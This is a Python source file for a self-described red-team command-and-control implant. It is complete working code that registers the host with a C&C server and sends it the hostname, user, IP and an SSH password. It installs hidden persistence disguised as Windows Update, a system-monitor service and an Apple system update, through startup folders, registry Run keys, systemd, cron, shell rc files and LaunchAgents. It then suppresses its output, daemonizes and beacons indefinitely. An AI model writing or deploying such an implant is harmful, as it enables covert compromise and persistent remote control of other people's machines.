#!/usr/bin/env python3
"""
Professional Red Team Agent - C&C Client
For authorized penetration testing only
"""

import socket
import platform
import random
import os
import sys
import time
import subprocess
import json
from pathlib import Path

# Try to import requests, fallback to urllib if not available
try:
    import requests
    USE_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    USE_REQUESTS = False

# Configuration - CHANGE THESE FOR YOUR ENGAGEMENT
CNC_SERVER = os.environ.get('CNC_SERVER', 'http://192.168.1.10:5000')
SSH_PORT = int(os.environ.get('SSH_PORT', '22'))
SSH_PASSWORD = os.environ.get('SSH_PASSWORD', 'CHANGE_ME')
BEACON_INTERVAL = int(os.environ.get('BEACON_INTERVAL', '60'))
MAX_RETRIES = 3
STEALTH_MODE = True  # Suppress output

class BotAgent:
    def __init__(self, cnc_server, stealth=True):
        self.cnc_server = cnc_server
        self.stealth = stealth
        self.bot_id = self.generate_bot_id()
        self.hostname = socket.gethostname()
        self.username = os.getenv('USER') or os.getenv('USERNAME')
        self.ip_address = self.get_ip_address()
        self.os_type = platform.system()
        self.retry_count = 0
        
    def log(self, message, level="INFO"):
        """Log messages only if not in stealth mode"""
        if not self.stealth:
            print(f"[{level}] {message}")
    
    def generate_bot_id(self):
        """Generate a unique bot ID"""
        hostname = socket.gethostname()
        return f"{hostname}-{random.randint(1000, 9999)}"
    
    def get_ip_address(self):
        """Get the local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            # Fallback methods
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "127.0.0.1"
    
    def http_post(self, url, data):
        """HTTP POST with fallback to urllib if requests unavailable"""
        if USE_REQUESTS:
            try:
                response = requests.post(url, json=data, timeout=10)
                return response.status_code == 200, response.status_code
            except Exception as e:
                return False, str(e)
        else:
            try:
                req_data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(
                    url,
                    data=req_data,
                    headers={'Content-Type': 'application/json'}
                )
                with urllib.request.urlopen(req, timeout=10) as response:
                    return response.status == 200, response.status
            except Exception as e:
                return False, str(e)
    
    def register_with_cnc(self):
        """Register this bot with the C&C server with retry logic"""
        self.log(f"Attempting to register with C&C server: {self.cnc_server}")
        self.log(f"Bot ID: {self.bot_id}")
        self.log(f"Hostname: {self.hostname}")
        self.log(f"Username: {self.username}")
        self.log(f"IP Address: {self.ip_address}")
        self.log(f"OS: {self.os_type}")
        
        payload = {
            "bot_id": self.bot_id,
            "host": self.ip_address,
            "port": SSH_PORT,
            "username": self.username,
            "password": SSH_PASSWORD,
            "hostname": self.hostname,
            "os": self.os_type
        }
        
        for attempt in range(MAX_RETRIES):
            try:
                success, status = self.http_post(f"{self.cnc_server}/add_bot", payload)
                
                if success:
                    self.log("Successfully registered with C&C server!", "+")
                    self.retry_count = 0
                    return True
                else:
                    self.log(f"Registration failed: {status}", "-")
                    
            except Exception as e:
                self.log(f"Error connecting to C&C server: {e}", "-")
            
            if attempt < MAX_RETRIES - 1:
                wait_time = (attempt + 1) * 5
                self.log(f"Retrying in {wait_time} seconds...")
                time.sleep(wait_time)
        
        return False
    
    def send_heartbeat(self):
        """Send heartbeat to C&C server to update last_seen status"""
        try:
            payload = {
                "bot_id": self.bot_id
            }
            success, status = self.http_post(f"{self.cnc_server}/heartbeat", payload)
            if success:
                self.log(f"Heartbeat sent successfully", ".")
                return True
            else:
                self.log(f"Heartbeat failed: {status}", "-")
                return False
        except Exception as e:
            self.log(f"Error sending heartbeat: {e}", "-")
            return False
    
    def establish_persistence_windows(self):
        """Establish persistence on Windows using multiple methods"""
        try:
            script_path = os.path.abspath(__file__)
            python_exe = sys.executable
            
            # Method 1: Startup folder (user-level, no admin required)
            try:
                startup_folder = os.path.join(
                    os.getenv('APPDATA'),
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
                )
                
                # Use VBScript to run silently
                vbs_path = os.path.join(startup_folder, 'WindowsUpdate.vbs')
                with open(vbs_path, 'w') as f:
                    f.write(f'CreateObject("Wscript.Shell").Run "{python_exe} ""{script_path}""", 0, False')
                
                self.log(f"Persistence established: {vbs_path}", "+")
                return True
            except Exception as e:
                self.log(f"Startup folder method failed: {e}", "-")
            
            # Method 2: Registry Run key (fallback)
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, 
                                f'"{python_exe}" "{script_path}"')
                winreg.CloseKey(key)
                self.log("Registry persistence established", "+")
                return True
            except Exception as e:
                self.log(f"Registry method failed: {e}", "-")
                
            return False
        except Exception as e:
            self.log(f"Failed to establish persistence: {e}", "-")
            return False
    
    def establish_persistence_linux(self):
        """Establish persistence on Linux with multiple fallback methods"""
        try:
            script_path = os.path.abspath(__file__)
            python_exe = sys.executable or 'python3'
            
            # Method 1: Systemd (requires root)
            if os.geteuid() == 0:
                try:
                    service_content = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User={self.username}
ExecStart={python_exe} {script_path}
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
                    service_path = '/etc/systemd/system/system-monitor.service'
                    with open(service_path, 'w') as f:
                        f.write(service_content)
                    
                    os.system('systemctl daemon-reload 2>/dev/null')
                    os.system('systemctl enable system-monitor.service 2>/dev/null')
                    os.system('systemctl start system-monitor.service 2>/dev/null')
                    self.log(f"Systemd service created: {service_path}", "+")
                    return True
                except Exception as e:
                    self.log(f"Systemd method failed: {e}", "-")
            
            # Method 2: Cron job (user-level)
            try:
                cron_cmd = f'(crontab -l 2>/dev/null | grep -v "{script_path}"; echo "@reboot {python_exe} {script_path} >/dev/null 2>&1") | crontab - 2>/dev/null'
                result = os.system(cron_cmd)
                if result == 0:
                    self.log("Cron job persistence established", "+")
                    return True
            except Exception as e:
                self.log(f"Cron method failed: {e}", "-")
            
            # Method 3: .bashrc / .profile (last resort)
            try:
                rc_files = [
                    os.path.expanduser('~/.bashrc'),
                    os.path.expanduser('~/.profile'),
                    os.path.expanduser('~/.bash_profile')
                ]
                
                for rc_file in rc_files:
                    if os.path.exists(rc_file):
                        with open(rc_file, 'a') as f:
                            f.write(f'\n# System monitor\n{python_exe} {script_path} >/dev/null 2>&1 &\n')
                        self.log(f"Shell persistence added to {rc_file}", "+")
                        return True
            except Exception as e:
                self.log(f"Shell RC method failed: {e}", "-")
                
            return False
        except Exception as e:
            self.log(f"Failed to establish persistence: {e}", "-")
            return False
    
    def establish_persistence(self):
        """Establish persistence based on OS"""
        self.log("Establishing persistence...")
        
        try:
            if self.os_type == "Windows":
                return self.establish_persistence_windows()
            elif self.os_type == "Linux":
                return self.establish_persistence_linux()
            elif self.os_type == "Darwin":  # macOS
                return self.establish_persistence_macos()
            else:
                self.log(f"Persistence not implemented for {self.os_type}", "-")
                return False
        except Exception as e:
            self.log(f"Persistence establishment failed: {e}", "-")
            return False
    
    def establish_persistence_macos(self):
        """Establish persistence on macOS using LaunchAgents"""
        try:
            script_path = os.path.abspath(__file__)
            python_exe = sys.executable or 'python3'
            
            # Create LaunchAgent plist
            plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.systemupdate.plist')
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_exe}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"""
            
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load the LaunchAgent
            os.system(f'launchctl load {plist_path} 2>/dev/null')
            self.log(f"LaunchAgent created: {plist_path}", "+")
            return True
            
        except Exception as e:
            self.log(f"macOS persistence failed: {e}", "-")
            return False
    
    def beacon_loop(self):
        """Maintain connection with C&C server with automatic reconnection"""
        self.log("Starting beacon loop...")
        consecutive_failures = 0
        max_failures = 10
        
        while True:
            try:
                time.sleep(BEACON_INTERVAL)
                
                # Send heartbeat to update last_seen and status
                if self.send_heartbeat():
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
                
                # Attempt to verify connection periodically
                if consecutive_failures > max_failures:
                    self.log("Max failures reached, attempting re-registration...", "!")
                    if self.register_with_cnc():
                        consecutive_failures = 0
                    else:
                        # Exponential backoff
                        time.sleep(min(300, BEACON_INTERVAL * (consecutive_failures // 2)))
                        
            except KeyboardInterrupt:
                self.log("Shutting down...", "!")
                break
            except Exception as e:
                consecutive_failures += 1
                self.log(f"Error in beacon loop: {e}", "-")
                time.sleep(BEACON_INTERVAL)

def daemonize():
    """Fork process to run in background (Unix-like systems only)"""
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError:
        pass
    
    os.setsid()
    
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError:
        pass
    
    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open(os.devnull, 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open(os.devnull, 'a+') as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

def main():
    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description='Red Team C&C Agent')
    parser.add_argument('--server', help='C&C server URL', default=CNC_SERVER)
    parser.add_argument('--no-persist', action='store_true', help='Skip persistence')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--daemon', action='store_true', help='Run as daemon (Unix)')
    args = parser.parse_args()
    
    # Override config with CLI args
    cnc_server = args.server
    stealth = not args.verbose
    
    # Daemonize if requested (Unix-like systems)
    if args.daemon and platform.system() != 'Windows':
        try:
            daemonize()
        except Exception:
            pass
    
    # Initialize bot agent
    agent = BotAgent(cnc_server, stealth=stealth)
    agent.log("="*60)
    agent.log("Red Team Agent Initializing...")
    agent.log("="*60)
    
    # Register with C&C server
    if agent.register_with_cnc():
        # Establish persistence unless disabled
        if not args.no_persist:
            agent.establish_persistence()
        else:
            agent.log("Skipping persistence (--no-persist)", "!")
        
        # Start beacon loop
        agent.beacon_loop()
    else:
        agent.log("Failed to initialize agent - will retry periodically", "-")
        # Don't exit, keep trying
        while True:
            time.sleep(300)  # Wait 5 minutes
            if agent.register_with_cnc():
                if not args.no_persist:
                    agent.establish_persistence()
                agent.beacon_loop()
                break

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        if not STEALTH_MODE:
            print(f"Fatal error: {e}")
        sys.exit(1)
